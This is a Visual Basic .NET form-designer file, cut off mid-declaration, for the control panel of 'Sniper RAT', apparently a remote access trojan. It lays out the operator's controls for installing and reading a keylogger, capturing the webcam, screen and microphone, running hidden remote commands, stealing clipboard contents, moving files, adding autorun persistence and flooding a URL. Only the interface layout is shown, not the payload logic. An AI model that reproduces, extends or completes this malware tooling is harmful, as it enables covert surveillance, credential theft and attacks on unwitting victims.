<Global.Microsoft.VisualBasic.CompilerServices.DesignerGenerated()> _
Partial Class frmControlPanel
    Inherits System.Windows.Forms.Form

    'Form esegue l'override del metodo Dispose per pulire l'elenco dei componenti.
    <System.Diagnostics.DebuggerNonUserCode()> _
    Protected Overrides Sub Dispose(ByVal disposing As Boolean)
        Try
            If disposing AndAlso components IsNot Nothing Then
                components.Dispose()
            End If
        Finally
            MyBase.Dispose(disposing)
        End Try
    End Sub

    'Richiesto da Progettazione Windows Form
    Private components As System.ComponentModel.IContainer

    'NOTA: la procedura che segue è richiesta da Progettazione Windows Form
    'Può essere modificata in Progettazione Windows Form.  
    'Non modificarla nell'editor del codice.
    <System.Diagnostics.DebuggerStepThrough()> _
    Private Sub InitializeComponent()
        Me.components = New System.ComponentModel.Container()
        Dim resources As System.ComponentModel.ComponentResourceManager = New System.ComponentModel.ComponentResourceManager(GetType(frmControlPanel))
        Me.lblCl = New System.Windows.Forms.Label()
        Me.lblClid = New System.Windows.Forms.Label()
        Me.tmrDatiPann = New System.Windows.Forms.Timer(Me.components)
        Me.lblBanCP = New System.Windows.Forms.Label()
        Me.lblIP = New System.Windows.Forms.Label()
        Me.lblExIp = New System.Windows.Forms.Label()
        Me.txtProID = New System.Windows.Forms.TextBox()
        Me.grpStatusP = New System.Windows.Forms.GroupBox()
        Me.cmdInfoPorte = New System.Windows.Forms.Button()
        Me.picSou = New System.Windows.Forms.PictureBox()
        Me.lblSu = New System.Windows.Forms.Label()
        Me.picDow = New System.Windows.Forms.PictureBox()
        Me.lblDow = New System.Windows.Forms.Label()
        Me.picUp = New System.Windows.Forms.PictureBox()
        Me.lblUp = New System.Windows.Forms.Label()
        Me.picKey = New System.Windows.Forms.PictureBox()
        Me.lblKey = New System.Windows.Forms.Label()
        Me.picWeb = New System.Windows.Forms.PictureBox()
        Me.lblWeb = New System.Windows.Forms.Label()
        Me.picScreen = New System.Windows.Forms.PictureBox()
        Me.lblScre = New System.Windows.Forms.Label()
        Me.tmrPannSchermo = New System.Windows.Forms.Timer(Me.components)
        Me.tmrDatiSchermo = New System.Windows.Forms.Timer(Me.components)
        Me.txtFeD = New System.Windows.Forms.TextBox()
        Me.cxmstrFileEDir = New System.Windows.Forms.ContextMenuStrip(Me.components)
        Me.RefreshToolStripMenuItem = New System.Windows.Forms.ToolStripMenuItem()
        Me.DeleteFileToolStripMenuItem = New System.Windows.Forms.ToolStripMenuItem()
        Me.DeleteEmptyFolderToolStripMenuItem = New System.Windows.Forms.ToolStripMenuItem()
        Me.RenameFileToolStripMenuItem = New System.Windows.Forms.ToolStripMenuItem()
        Me.RenameFolderToolStripMenuItem = New System.Windows.Forms.ToolStripMenuItem()
        Me.StartFileToolStripMenuItem = New System.Windows.Forms.ToolStripMenuItem()
        Me.CopyToolStripMenuItem = New System.Windows.Forms.ToolStripMenuItem()
        Me.PasteToolStripMenuItem = New System.Windows.Forms.ToolStripMenuItem()
        Me.MakeANewFolderToolStripMenuItem = New System.Windows.Forms.ToolStripMenuItem()
        Me.ToolStripSeparator1 = New System.Windows.Forms.ToolStripSeparator()
        Me.AddToDownloadListToolStripMenuItem = New System.Windows.Forms.ToolStripMenuItem()
        Me.AddInUploadInProgressListToolStripMenuItem = New System.Windows.Forms.ToolStripMenuItem()
        Me.SetAsWallpaperToolStripMenuItem = New System.Windows.Forms.ToolStripMenuItem()
        Me.StartWavFileToolStripMenuItem = New System.Windows.Forms.ToolStripMenuItem()
        Me.AddFileInAutorunFolderToolStripMenuItem = New System.Windows.Forms.ToolStripMenuItem()
        Me.cxmstrPoSch = New System.Windows.Forms.ContextMenuStrip(Me.components)
        Me.StartListeningToolStripMenuItem = New System.Windows.Forms.ToolStripMenuItem()
        Me.CloseConnectionToolStripMenuItem = New System.Windows.Forms.ToolStripMenuItem()
        Me.cxmstrPoDow = New System.Windows.Forms.ContextMenuStrip(Me.components)
        Me.StartListeningToolStripMenuItem1 = New System.Windows.Forms.ToolStripMenuItem()
        Me.CloseConnectionToolStripMenuItem1 = New System.Windows.Forms.ToolStripMenuItem()
        Me.tmrPannDow = New System.Windows.Forms.Timer(Me.components)
        Me.tmrDatiDow = New System.Windows.Forms.Timer(Me.components)
        Me.cxmstrDow = New System.Windows.Forms.ContextMenuStrip(Me.components)
        Me.RemoveFromTheListToolStripMenuItem = New System.Windows.Forms.ToolStripMenuItem()
        Me.tmrPannUp = New System.Windows.Forms.Timer(Me.components)
        Me.tmrDatiUp = New System.Windows.Forms.Timer(Me.components)
        Me.cxmstrPoUp = New System.Windows.Forms.ContextMenuStrip(Me.components)
        Me.StartToolStripMenuItem = New System.Windows.Forms.ToolStripMenuItem()
        Me.CloseConnectionToolStripMenuItem2 = New System.Windows.Forms.ToolStripMenuItem()
        Me.cxmstrUp = New System.Windows.Forms.ContextMenuStrip(Me.components)
        Me.RemoveFileFromTheListToolStripMenuItem = New System.Windows.Forms.ToolStripMenuItem()
        Me.tbpWebc = New System.Windows.Forms.TabPage()
        Me.chkImmSizeW = New System.Windows.Forms.CheckBox()
        Me.cmdOpImmW = New System.Windows.Forms.Button()
        Me.grpQuImm = New System.Windows.Forms.GroupBox()
        Me.cmdRIMMW = New System.Windows.Forms.Button()
        Me.lblPerW = New System.Windows.Forms.Label()
        Me.cmdSetPerW = New System.Windows.Forms.Button()
        Me.lblQuaW = New System.Windows.Forms.Label()
        Me.nudQW = New System.Windows.Forms.NumericUpDown()
        Me.cmdSetW = New System.Windows.Forms.Button()
        Me.lblFormWXY = New System.Windows.Forms.Label()
        Me.lblkbWeb = New System.Windows.Forms.Label()
        Me.prgDatiWeb = New System.Windows.Forms.ProgressBar()
        Me.cmdGTW = New System.Windows.Forms.Button()
        Me.combDri = New System.Windows.Forms.ComboBox()
        Me.lblDrivAV = New System.Windows.Forms.Label()
        Me.picBanWeb = New System.Windows.Forms.PictureBox()
        Me.tbcMex = New System.Windows.Forms.TabPage()
        Me.txtLogmex = New System.Windows.Forms.TextBox()
        Me.lblLog = New System.Windows.Forms.Label()
        Me.grpInvMex = New System.Windows.Forms.GroupBox()
        Me.cmdCTEMR = New System.Windows.Forms.Button()
        Me.cmdClearlogMex = New System.Windows.Forms.Button()
        Me.cmdSendmex = New System.Windows.Forms.Button()
        Me.cmdTestMex = New System.Windows.Forms.Button()
        Me.txtMess = New System.Windows.Forms.TextBox()
        Me.lblMex = New System.Windows.Forms.Label()
        Me.txtTitle = New System.Windows.Forms.TextBox()
        Me.lblTitleMex = New System.Windows.Forms.Label()
        Me.grpchkDom = New System.Windows.Forms.GroupBox()
        Me.rbutYNI = New System.Windows.Forms.RadioButton()
        Me.rbutYNC = New System.Windows.Forms.RadioButton()
        Me.rbutYN = New System.Windows.Forms.RadioButton()
        Me.grpMT = New System.Windows.Forms.GroupBox()
        Me.lblMStyle = New System.Windows.Forms.Label()
        Me.lblSSB = New System.Windows.Forms.Label()
        Me.cmdNothg = New System.Windows.Forms.Button()
        Me.cmdDom = New System.Windows.Forms.Button()
        Me.cmdWa = New System.Windows.Forms.Button()
        Me.cmdEr = New System.Windows.Forms.Button()
        Me.cmdInfo = New System.Windows.Forms.Button()
        Me.tbpFileMan = New System.Windows.Forms.TabPage()
        Me.tbcFilesDDU = New System.Windows.Forms.TabControl()
        Me.tbpFD = New System.Windows.Forms.TabPage()
        Me.txtPath = New System.Windows.Forms.TextBox()
        Me.cmdGetDr = New System.Windows.Forms.Button()
        Me.lblInfoFD = New System.Windows.Forms.Label()
        Me.chkModListFD = New System.Windows.Forms.CheckBox()
        Me.cmdCCListFD = New System.Windows.Forms.Button()
        Me.lstwFileFolderR = New System.Windows.Forms.ListView()
        Me.tbpDAUIP = New System.Windows.Forms.TabPage()
        Me.lblStatUp = New System.Windows.Forms.Label()
        Me.lblBytesD = New System.Windows.Forms.Label()
        Me.chkAvvFFUp = New System.Windows.Forms.CheckBox()
        Me.cmsStartUp = New System.Windows.Forms.Button()
        Me.cmdStartDow = New System.Windows.Forms.Button()
        Me.prgDown = New System.Windows.Forms.ProgressBar()
        Me.lblUpping = New System.Windows.Forms.Label()
        Me.lblDowwing = New System.Windows.Forms.Label()
        Me.chkAvvFFin = New System.Windows.Forms.CheckBox()
        Me.cmdSPing = New System.Windows.Forms.Button()
        Me.cmdSDing = New System.Windows.Forms.Button()
        Me.lstwUpL = New System.Windows.Forms.ListView()
        Me.lstwDowL = New System.Windows.Forms.ListView()
        Me.tb2 = New System.Windows.Forms.TabPage()
        Me.picBanDesk = New System.Windows.Forms.PictureBox()
        Me.grpPMang = New System.Windows.Forms.GroupBox()
        Me.cmdResText = New System.Windows.Forms.Button()
        Me.cmdCancellaTestoP = New System.Windows.Forms.Button()
        Me.cmdPiPP = New System.Windows.Forms.Button()
        Me.cmdPrintOnDesk = New System.Windows.Forms.Button()
        Me.txtTesto = New System.Windows.Forms.TextBox()
        Me.grpScrSS = New System.Windows.Forms.GroupBox()
        Me.cmdHWR = New System.Windows.Forms.Button()
        Me.lblYN = New System.Windows.Forms.Label()
        Me.lblY = New System.Windows.Forms.Label()
        Me.lblXN = New System.Windows.Forms.Label()
        Me.lblX = New System.Windows.Forms.Label()
        Me.cmdGDSR = New System.Windows.Forms.Button()
        Me.cmdVisII = New System.Windows.Forms.Button()
        Me.tb1 = New System.Windows.Forms.TabPage()
        Me.cmdStartSite = New System.Windows.Forms.Button()
        Me.txtURLR = New System.Windows.Forms.TextBox()
        Me.lblRTO = New System.Windows.Forms.Label()
        Me.lblClip = New System.Windows.Forms.Label()
        Me.txtClip = New System.Windows.Forms.TextBox()
        Me.tcTask = New System.Windows.Forms.TabControl()
        Me.tbPL = New System.Windows.Forms.TabPage()
        Me.lstwProcessi = New System.Windows.Forms.ListView()
        Me.grpWinRem = New System.Windows.Forms.GroupBox()
        Me.cmdHid = New System.Windows.Forms.Button()
        Me.cmdRes = New System.Windows.Forms.Button()
        Me.cmdMin = New System.Windows.Forms.Button()
        Me.cmdMax = New System.Windows.Forms.Button()
        Me.grpTask = New System.Windows.Forms.GroupBox()
        Me.picStart = New System.Windows.Forms.PictureBox()
        Me.rbtMa = New System.Windows.Forms.RadioButton()
        Me.rbtMi = New System.Windows.Forms.RadioButton()
        Me.rbtNo = New System.Windows.Forms.RadioButton()
        Me.rbtHi = New System.Windows.Forms.RadioButton()
        Me.cmdAvviAs = New System.Windows.Forms.Button()
        Me.lblPDAVV = New System.Windows.Forms.Label()
        Me.txtProcessoDAA = New System.Windows.Forms.TextBox()
        Me.cmdTerminaPB = New System.Windows.Forms.Button()
        Me.cmdTerminaPN = New System.Windows.Forms.Button()
        Me.cmdCancellaL = New System.Windows.Forms.Button()
        Me.cmdOttieniP = New System.Windows.Forms.Button()
        Me.tbcPannello = New System.Windows.Forms.TabControl()
        Me.tbpKey = New System.Windows.Forms.TabPage()
        Me.cmdClrTxt = New System.Windows.Forms.Button()
        Me.txtacK = New System.Windows.Forms.TextBox()
        Me.lblTipTxtAck = New System.Windows.Forms.Label()
        Me.lblOKS = New System.Windows.Forms.Label()
        Me.lblStppK = New System.Windows.Forms.Label()
        Me.cmdStopK = New System.Windows.Forms.Button()
        Me.cdSTARTOnK = New System.Windows.Forms.Button()
        Me.cmdGetK = New System.Windows.Forms.Button()
        Me.cmdInstallK = New System.Windows.Forms.Button()
        Me.txtKey = New System.Windows.Forms.TextBox()
        Me.picKB = New System.Windows.Forms.PictureBox()
        Me.cmdSaveKs = New System.Windows.Forms.Button()
        Me.tbMicroP = New System.Windows.Forms.TabPage()
        Me.grpVolR = New System.Windows.Forms.GroupBox()
        Me.cmdSetAlC = New System.Windows.Forms.Button()
        Me.cmdMuteR = New System.Windows.Forms.Button()
        Me.cmdSetVR = New System.Windows.Forms.Button()
        Me.picSound = New System.Windows.Forms.PictureBox()
        Me.grpLocRec = New System.Windows.Forms.GroupBox()
        Me.lblTOTKbLo = New System.Windows.Forms.Label()
        Me.cmdStopRecLO = New System.Windows.Forms.Button()
        Me.cmdREcLoc = New System.Windows.Forms.Button()
        Me.grpS1 = New System.Windows.Forms.GroupBox()
        Me.cmdGetDS = New System.Windows.Forms.Button()
        Me.lblTotKbS = New System.Windows.Forms.Label()
        Me.prgDatS = New System.Windows.Forms.ProgressBar()
        Me.lblArrDat = New System.Windows.Forms.Label()
        Me.cmdStopRec = New System.Windows.Forms.Button()
        Me.cmdStartRec = New System.Windows.Forms.Button()
        Me.lblRecTim = New System.Windows.Forms.Label()
        Me.lblRecT = New System.Windows.Forms.Label()
        Me.tbpChat = New System.Windows.Forms.TabPage()
        Me.lblTipChat = New System.Windows.Forms.Label()
        Me.cmdSendC = New System.Windows.Forms.Button()
        Me.cmdCloseC = New System.Windows.Forms.Button()
        Me.cmdOpenC = New System.Windows.Forms.Button()
        Me.txtChatB = New System.Windows.Forms.TextBox()
        Me.txtRName = New System.Windows.Forms.TextBox()
        Me.lblRN = New System.Windows.Forms.Label()
        Me.txtName = New System.Windows.Forms.TextBox()
        Me.lblName = New System.Windows.Forms.Label()
        Me.txtChatBox = New System.Windows.Forms.TextBox()
        Me.tbPorts = New System.Windows.Forms.TabPage()
        Me.grpPS = New System.Windows.Forms.GroupBox()
        Me.cmdSetPorts = New System.Windows.Forms.Button()
        Me.picF = New System.Windows.Forms.PictureBox()
        Me.nudSD = New System.Windows.Forms.NumericUpDown()
        Me.lbl6 = New System.Windows.Forms.Label()
        Me.nudD = New System.Windows.Forms.NumericUpDown()
        Me.lbl5 = New System.Windows.Forms.Label()
        Me.nudU = New System.Windows.Forms.NumericUpDown()
        Me.lbl4 = New System.Windows.Forms.Label()
        Me.NudK = New System.Windows.Forms.NumericUpDown()
        Me.lbl3 = New System.Windows.Forms.Label()
        Me.nudW = New System.Windows.Forms.NumericUpDown()
        Me.lbl2 = New System.Windows.Forms.Label()
        Me.nudS = New System.Windows.Forms.NumericUpDown()
        Me.lbl1 = New System.Windows.Forms.Label()
        Me.tbClip = New System.Windows.Forms.TabPage()
        Me.lblCTip = New System.Windows.Forms.Label()
        Me.txtVisNoLis = New System.Windows.Forms.TextBox()
        Me.cmdCloSet = New System.Windows.Forms.Button()
        Me.cmdSet = New System.Windows.Forms.Button()
        Me.txtData = New System.Windows.Forms.TextBox()
        Me.lstwClipboard = New System.Windows.Forms.ListView()
        Me.tbDD = New System.Windows.Forms.TabPage()
        Me.lblTipFloo = New System.Windows.Forms.Label()
        Me.grpFlloo = New System.Windows.Forms.GroupBox()
        Me.cmdstaFlo = New System.Windows.Forms.Button()
        Me.nudFloo = New System.Windows.Forms.NumericUpDown()
        Me.lblTimes = New System.Windows.Forms.Label()
        Me.txtUFlo = New System.Windows.Forms.TextBox()
        Me.lblUFlo = New System.Windows.Forms.Label()
        Me.tbCMD = New System.Windows.Forms.TabPage()
        Me.cmdGETOUT = New System.Windows.Forms.Button()
        Me.chkHCR = New System.Windows.Forms.CheckBox()
        Me.cmdCCMDO = New System.Windows.Forms.Button()
        Me.cmdSECMD = New System.Windows.Forms.Button()
        Me.txtCOMCMD = New System.Windows.Forms.TextBox()
        Me.txtCMDOUT = New System.Windows.Forms.TextBox()
        Me.tbpRegRun = New System.Windows.Forms.TabPage()
        Me.cmdCleLst = New System.Windows.Forms.Button()
        Me.cmdGetRunC = New System.Windows.Forms.Button()
        Me.lstRunSo = New System.Windows.Forms.ListBox()
        Me.tmrPannWeb = New System.Windows.Forms.Timer(Me.components)
        Me.cxmstrWeb = New System.Windows.Forms.ContextMenuStrip(Me.components)
        Me.StartListeningToolStripMenuItem2 = New System.Windows.Forms.ToolStripMenuItem()
        Me.CloseConnectionToolStripMenuItem3 = New System.Windows.Forms.ToolStripMenuItem()
        Me.tmrDatiWeb = New System.Windows.Forms.Timer(Me.components)
        Me.cxmstrKey = New System.Windows.Forms.ContextMenuStrip(Me.components)
        Me.StartListeningToolStripMenuItem3 = New System.Windows.Forms.ToolStripMenuItem()
        Me.CloseConnectionToolStripMenuItem4 = New System.Windows.Forms.ToolStripMenuItem()
        Me.tmrDatiKey = New System.Windows.Forms.Timer(Me.components)
        Me.tmrPannKey = New System.Windows.Forms.Timer(Me.components)
        Me.cxmstrClip = New System.Windows.Forms.ContextMenuStrip(Me.components)
        Me.AddValueToolStripMenuItem = New System.Windows.Forms.ToolStripMenuItem()
        Me.DeleteSelectedToolStripMenuItem = New System.Windows.Forms.ToolStripMenuItem()
        Me.ClearListToolStripMenuItem = New System.Windows.Forms.ToolStripMenuItem()
        Me.ClearListToolStripMenuItem1 = New System.Windows.Forms.ToolStripMenuItem()
        Me.SendYourClipboardToolStripMenuItem = New System.Windows.Forms.ToolStripMenuItem()
        Me.cxmstrSou = New System.Windows.Forms.ContextMenuStrip(Me.components)
        Me.StartListeningToolStripMenuItem4 = New System.Windows.Forms.ToolStripMenuItem()
        Me.CloseConnectionToolStripMenuItem5 = New System.Windows.Forms.ToolStripMenuItem()
        Me.tmrPannSuono = New System.Windows.Forms.Timer(Me.components)
        Me.tmrDatiSuono = New System.Windows.Forms.Timer(Me.components)
        Me.bkwSD = New System.ComponentModel.BackgroundWorker()
        Me.picDisPC = New System.Windows.Forms.PictureBox()
        Me.grpStatusP.SuspendLayout()
        CType(Me.picSou, System.ComponentModel.ISupportInitialize).BeginInit()
        CType(Me.picDow, System.ComponentModel.ISupportInitialize).BeginInit()
        CType(Me.picUp, System.ComponentModel.ISupportInitialize).BeginInit()
        CType(Me.picKey, System.ComponentModel.ISupportInitialize).BeginInit()
        CType(Me.picWeb, System.ComponentModel.ISupportInitialize).BeginInit()
        CType(Me.picScreen, System.ComponentModel.ISupportInitialize).BeginInit()
        Me.cxmstrFileEDir.SuspendLayout()
        Me.cxmstrPoSch.SuspendLayout()
        Me.cxmstrPoDow.SuspendLayout()
        Me.cxmstrDow.SuspendLayout()
        Me.cxmstrPoUp.SuspendLayout()
        Me.cxmstrUp.SuspendLayout()
        Me.tbpWebc.SuspendLayout()
        Me.grpQuImm.SuspendLayout()
        CType(Me.nudQW, System.ComponentModel.ISupportInitialize).BeginInit()
        CType(Me.picBanWeb, System.ComponentModel.ISupportInitialize).BeginInit()
        Me.tbcMex.SuspendLayout()
        Me.grpInvMex.SuspendLayout()
        Me.grpchkDom.SuspendLayout()
        Me.grpMT.SuspendLayout()
        Me.tbpFileMan.SuspendLayout()
        Me.tbcFilesDDU.SuspendLayout()
        Me.tbpFD.SuspendLayout()
        Me.tbpDAUIP.SuspendLayout()
        Me.tb2.SuspendLayout()
        CType(Me.picBanDesk, System.ComponentModel.ISupportInitialize).BeginInit()
        Me.grpPMang.SuspendLayout()
        Me.grpScrSS.SuspendLayout()
        Me.tb1.SuspendLayout()
        Me.tcTask.SuspendLayout()
        Me.tbPL.SuspendLayout()
        Me.grpWinRem.SuspendLayout()
        Me.grpTask.SuspendLayout()
        CType(Me.picStart, System.ComponentModel.ISupportInitialize).BeginInit()
        Me.tbcPannello.SuspendLayout()
        Me.tbpKey.SuspendLayout()
        CType(Me.picKB, System.ComponentModel.ISupportInitialize).BeginInit()
        Me.tbMicroP.SuspendLayout()
        Me.grpVolR.SuspendLayout()
        CType(Me.picSound, System.ComponentModel.ISupportInitialize).BeginInit()
        Me.grpLocRec.SuspendLayout()
        Me.grpS1.SuspendLayout()
        Me.tbpChat.SuspendLayout()
        Me.tbPorts.SuspendLayout()
        Me.grpPS.SuspendLayout()
        CType(Me.picF, System.ComponentModel.ISupportInitialize).BeginInit()
        CType(Me.nudSD, System.ComponentModel.ISupportInitialize).BeginInit()
        CType(Me.nudD, System.ComponentModel.ISupportInitialize).BeginInit()
        CType(Me.nudU, System.ComponentModel.ISupportInitialize).BeginInit()
        CType(Me.NudK, System.ComponentModel.ISupportInitialize).BeginInit()
        CType(Me.nudW, System.ComponentModel.ISupportInitialize).BeginInit()
        CType(Me.nudS, System.ComponentModel.ISupportInitialize).BeginInit()
        Me.tbClip.SuspendLayout()
        Me.tbDD.SuspendLayout()
        Me.grpFlloo.SuspendLayout()
        CType(Me.nudFloo, System.ComponentModel.ISupportInitialize).BeginInit()
        Me.tbCMD.SuspendLayout()
        Me.tbpRegRun.SuspendLayout()
        Me.cxmstrWeb.SuspendLayout()
        Me.cxmstrKey.SuspendLayout()
        Me.cxmstrClip.SuspendLayout()
        Me.cxmstrSou.SuspendLayout()
        CType(Me.picDisPC, System.ComponentModel.ISupportInitialize).BeginInit()
        Me.SuspendLayout()
        '
        'lblCl
        '
        Me.lblCl.AutoSize = True
        Me.lblCl.Font = New System.Drawing.Font("Microsoft Sans Serif", 8.25!, System.Drawing.FontStyle.Bold, System.Drawing.GraphicsUnit.Point, CType(0, Byte))
        Me.lblCl.Location = New System.Drawing.Point(12, 13)
        Me.lblCl.Name = "lblCl"
        Me.lblCl.Size = New System.Drawing.Size(60, 13)
        Me.lblCl.TabIndex = 1
        Me.lblCl.Text = "Client ID:"
        '
        'lblClid
        '
        Me.lblClid.AutoSize = True
        Me.lblClid.Location = New System.Drawing.Point(78, 13)
        Me.lblClid.Name = "lblClid"
        Me.lblClid.Size = New System.Drawing.Size(13, 13)
        Me.lblClid.TabIndex = 2
        Me.lblClid.Text = "0"
        '
        'tmrDatiPann
        '
        Me.tmrDatiPann.Interval = 1
        '
        'lblBanCP
        '
        Me.lblBanCP.AutoSize = True
        Me.lblBanCP.Font = New System.Drawing.Font("Microsoft Sans Serif", 12.0!, System.Drawing.FontStyle.Bold, System.Drawing.GraphicsUnit.Point, CType(0, Byte))
        Me.lblBanCP.ForeColor = System.Drawing.Color.Red
        Me.lblBanCP.Location = New System.Drawing.Point(244, 4)
        Me.lblBanCP.Name = "lblBanCP"
        Me.lblBanCP.Size = New System.Drawing.Size(319, 20)
        Me.lblBanCP.TabIndex = 11
        Me.lblBanCP.Text = "Sniper RAT - Control panel - main form"
        '
        'lblIP
        '
        Me.lblIP.AutoSize = True
        Me.lblIP.Font = New System.Drawing.Font("Microsoft Sans Serif", 8.25!, System.Drawing.FontStyle.Bold, System.Drawing.GraphicsUnit.Point, CType(0, Byte))
        Me.lblIP.ForeColor = System.Drawing.Color.FromArgb(CType(CType(64, Byte), Integer), CType(CType(64, Byte), Integer), CType(CType(64, Byte), Integer))
        Me.lblIP.Location = New System.Drawing.Point(246, 29)
        Me.lblIP.Name = "lblIP"
        Me.lblIP.Size = New System.Drawing.Size(68, 13)
        Me.lblIP.TabIndex = 12
        Me.lblIP.Text = "Your ip is: "
        '
        'lblExIp
        '
        Me.lblExIp.AutoSize = True
        Me.lblExIp.Font = New System.Drawing.Font("Microsoft Sans Serif", 8.25!, CType((System.Drawing.FontStyle.Bold Or System.Drawing.FontStyle.Italic), System.Drawing.FontStyle), System.Drawing.GraphicsUnit.Point, CType(0, Byte))
        Me.lblExIp.Location = New System.Drawing.Point(320, 30)
        Me.lblExIp.Name = "lblExIp"
        Me.lblExIp.Size = New System.Drawing.Size(0, 13)
        Me.lblExIp.TabIndex = 13
        '
        'txtProID
        '
        Me.txtProID.Location = New System.Drawing.Point(454, 29)
        Me.txtProID.Multiline = True
        Me.txtProID.Name = "txtProID"
        Me.txtProID.Size = New System.Drawing.Size(20, 20)
        Me.txtProID.TabIndex = 15
        Me.txtProID.Visible = False
        '
        'grpStatusP
        '
        Me.grpStatusP.Controls.Add(Me.cmdInfoPorte)
        Me.grpStatusP.Controls.Add(Me.picSou)
        Me.grpStatusP.Controls.Add(Me.lblSu)
        Me.grpStatusP.Controls.Add(Me.picDow)
        Me.grpStatusP.Controls.Add(Me.lblDow)
        Me.grpStatusP.Controls.Add(Me.picUp)
        Me.grpStatusP.Controls.Add(Me.lblUp)
        Me.grpStatusP.Controls.Add(Me.picKey)
        Me.grpStatusP.Controls.Add(Me.lblKey)
        Me.grpStatusP.Controls.Add(Me.picWeb)
        Me.grpStatusP.Controls.Add(Me.lblWeb)
        Me.grpStatusP.Controls.Add(Me.picScreen)
        Me.grpStatusP.Controls.Add(Me.lblScre)
        Me.grpStatusP.Location = New System.Drawing.Point(11, 553)
        Me.grpStatusP.Name = "grpStatusP"
        Me.grpStatusP.Size = New System.Drawing.Size(552, 36)
        Me.grpStatusP.TabIndex = 17
        Me.grpStatusP.TabStop = False
        Me.grpStatusP.Text = "Port status"
        '
        'cmdInfoPorte
        '
        Me.cmdInfoPorte.Location = New System.Drawing.Point(513, 11)
        Me.cmdInfoPorte.Name = "cmdInfoPorte"
        Me.cmdInfoPorte.Size = New System.Drawing.Size(35, 23)
        Me.cmdInfoPorte.TabIndex = 12
        Me.cmdInfoPorte.Text = "??"
        Me.cmdInfoPorte.UseVisualStyleBackColor = True
        '
        'picSou
        '
        Me.picSou.BackColor = System.Drawing.Color.Red
        Me.picSou.Location = New System.Drawing.Point(413, 16)
        Me.picSou.Name = "picSou"
        Me.picSou.Size = New System.Drawing.Size(10, 14)
        Me.picSou.TabIndex = 11
        Me.picSou.TabStop = False
        '
        'lblSu
        '
        Me.lblSu.AutoSize = True
        Me.lblSu.Location = New System.Drawing.Point(366, 17)
        Me.lblSu.Name = "lblSu"
        Me.lblSu.Size = New System.Drawing.Size(41, 13)
        Me.lblSu.TabIndex = 10
        Me.lblSu.Text = "Sound:"
        '
        'picDow
        '
        Me.picDow.BackColor = System.Drawing.Color.Red
        Me.picDow.Location = New System.Drawing.Point(350, 16)
        Me.picDow.Name = "picDow"
        Me.picDow.Size = New System.Drawing.Size(10, 14)
        Me.picDow.TabIndex = 9
        Me.picDow.TabStop = False
        '
        'lblDow
        '
        Me.lblDow.AutoSize = True
        Me.lblDow.Location = New System.Drawing.Point(286, 17)
        Me.lblDow.Name = "lblDow"
        Me.lblDow.Size = New System.Drawing.Size(58, 13)
        Me.lblDow.TabIndex = 8
        Me.lblDow.Text = "Download:"
        '
        'picUp
        '
        Me.picUp.BackColor = System.Drawing.Color.Red
        Me.picUp.Location = New System.Drawing.Point(270, 16)
        Me.picUp.Name = "picUp"
        Me.picUp.Size = New System.Drawing.Size(10, 14)
        Me.picUp.TabIndex = 7
        Me.picUp.TabStop = False
        '
        'lblUp
        '
        Me.lblUp.AutoSize = True
        Me.lblUp.Location = New System.Drawing.Point(220, 17)
        Me.lblUp.Name = "lblUp"
        Me.lblUp.Size = New System.Drawing.Size(44, 13)
        Me.lblUp.TabIndex = 6
        Me.lblUp.Text = "Upload:"
        '
        'picKey
        '
        Me.picKey.BackColor = System.Drawing.Color.Red
        Me.picKey.Location = New System.Drawing.Point(204, 16)
        Me.picKey.Name = "picKey"
        Me.picKey.Size = New System.Drawing.Size(10, 14)
        Me.picKey.TabIndex = 5
        Me.picKey.TabStop = False
        '
        'lblKey
        '
        Me.lblKey.AutoSize = True
        Me.lblKey.Location = New System.Drawing.Point(141, 17)
        Me.lblKey.Name = "lblKey"
        Me.lblKey.Size = New System.Drawing.Size(57, 13)
        Me.lblKey.TabIndex = 4
        Me.lblKey.Text = "Keylogger:"
        '
        'picWeb
        '
        Me.picWeb.BackColor = System.Drawing.Color.Red
        Me.picWeb.Location = New System.Drawing.Point(125, 16)
        Me.picWeb.Name = "picWeb"
        Me.picWeb.Size = New System.Drawing.Size(10, 14)
        Me.picWeb.TabIndex = 3
        Me.picWeb.TabStop = False
        '
        'lblWeb
        '
        Me.lblWeb.AutoSize = True
        Me.lblWeb.Location = New System.Drawing.Point(66, 17)
        Me.lblWeb.Name = "lblWeb"
        Me.lblWeb.Size = New System.Drawing.Size(53, 13)
        Me.lblWeb.TabIndex = 2
        Me.lblWeb.Text = "Webcam:"
        '
        'picScreen
        '
        Me.picScreen.BackColor = System.Drawing.Color.Red
        Me.picScreen.Location = New System.Drawing.Point(50, 16)
        Me.picScreen.Name = "picScreen"
        Me.picScreen.Size = New System.Drawing.Size(10, 14)
        Me.picScreen.TabIndex = 1
        Me.picScreen.TabStop = False
        '
        'lblScre
        '
        Me.lblScre.AutoSize = True
        Me.lblScre.Location = New System.Drawing.Point(6, 16)
        Me.lblScre.Name = "lblScre"
        Me.lblScre.Size = New System.Drawing.Size(44, 13)
        Me.lblScre.TabIndex = 0
        Me.lblScre.Text = "Screen:"
        '
        'tmrPannSchermo
        '
        Me.tmrPannSchermo.Interval = 1
        '
        'tmrDatiSchermo
        '
        Me.tmrDatiSchermo.Interval = 1
        '
        'txtFeD
        '
        Me.txtFeD.Location = New System.Drawing.Point(402, 27)
        Me.txtFeD.Multiline = True
        Me.txtFeD.Name = "txtFeD"
        Me.txtFeD.Size = New System.Drawing.Size(20, 20)
        Me.txtFeD.TabIndex = 18
        Me.txtFeD.Visible = False
        '
        'cxmstrFileEDir
        '
        Me.cxmstrFileEDir.Items.AddRange(New System.Windows.Forms.ToolStripItem() {Me.RefreshToolStripMenuItem, Me.DeleteFileToolStripMenuItem, Me.DeleteEmptyFolderToolStripMenuItem, Me.RenameFileToolStripMenuItem, Me.RenameFolderToolStripMenuItem, Me.StartFileToolStripMenuItem, Me.CopyToolStripMenuItem, Me.PasteToolStripMenuItem, Me.MakeANewFolderToolStripMenuItem, Me.ToolStripSeparator1, Me.AddToDownloadListToolStripMenuItem, Me.AddInUploadInProgressListToolStripMenuItem, Me.SetAsWallpaperToolStripMenuItem, Me.StartWavFileToolStripMenuItem, Me.AddFileInAutorunFolderToolStripMenuItem})
        Me.cxmstrFileEDir.Name = "cxmstrFileEDir"
        Me.cxmstrFileEDir.Size = New System.Drawing.Size(245, 340)
        '
        'RefreshToolStripMenuItem
        '
        Me.RefreshToolStripMenuItem.Image = Global.Sniper.My.Resources.Resources._1298924187_interact
        Me.RefreshToolStripMenuItem.Name = "RefreshToolStripMenuItem"
        Me.RefreshToolStripMenuItem.Size = New System.Drawing.Size(244, 22)
        Me.RefreshToolStripMenuItem.Text = "Refresh"
        '
        'DeleteFileToolStripMenuItem
        '
